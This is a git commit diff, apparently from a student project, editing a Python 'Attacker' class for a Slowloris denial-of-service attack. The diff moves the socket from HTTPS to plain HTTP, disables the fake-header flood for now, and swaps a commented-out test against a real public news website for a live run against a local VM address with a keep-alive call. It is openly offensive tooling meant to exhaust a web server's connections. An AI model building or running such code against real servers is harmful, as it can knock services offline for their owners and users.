67af9a4425371166ae7f7dbba192248e57b88172
David Hellwig <helldavi@isu.edu>
2022-10-23 22:07:23 -0600

    Had to downgrade to HTTP only for now, can now connect to a vm for testing

--- Slow-Loris/Attacker.py
+++ Slow-Loris/Attacker.py
@@ -6,7 +6,8 @@ import random
 class Attacker:
     def __init__(self, target):
         self.target = target
-        self.port = 443
+        #We are going back to http for now
+        self.port = 80
         self.loris = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.status = "Unconnected"
 
@@ -21,25 +22,28 @@ class Attacker:
     #This method creates the sockets that will be used in the attack
     def createSocket(self):
 
-
+        #Todo Go back to Http
         try:
-            self.loris = ssl.wrap_socket(self.loris, ssl_version=ssl.PROTOCOL_SSLv23)
+            #self.loris = ssl.wrap_socket(self.loris, ssl_version=ssl.PROTOCOL_SSLv23)
+
+           # self.loris.bind(('',1337))
 
             self.loris.connect((self.target, self.port))
+            #downgrading to this for now
+            request = "GET / HTTP/1.0\r\n\r\n"
 
-            request = "GET / HTTP/1.1\nHost: " + self.target + "\r\n\r\n"
             self.loris.send(request.encode())
 
 
 
             #Send fake header elements to target
-            for element in self.fakeHeaderList:
-                self.loris.send(bytes(bytes("{}\r\n".format(element).encode("utf-8"))))
+            #for element in self.fakeHeaderList:
+             #   self.loris.send(bytes(bytes("{}\r\n".format(element).encode("utf-8"))))
 
 
-            #info = self.loris.recv(10000)
+            info = self.loris.recv(10000)
 
-            #print(info.decode("utf-8"))
+            print(info.decode("utf-8"))
 
 
             self.status = "Connected to " + self.target + " Target on port 443"
@@ -68,6 +72,7 @@ class Attacker:
     def returnStatus(self):
         return self.status
 
-#test = Attacker("www.cnn.com")
-#test.createSocket()
+test = Attacker("192.168.0.243")
+test.createSocket()
+test.stayAlive()
 #test.attackTarget()
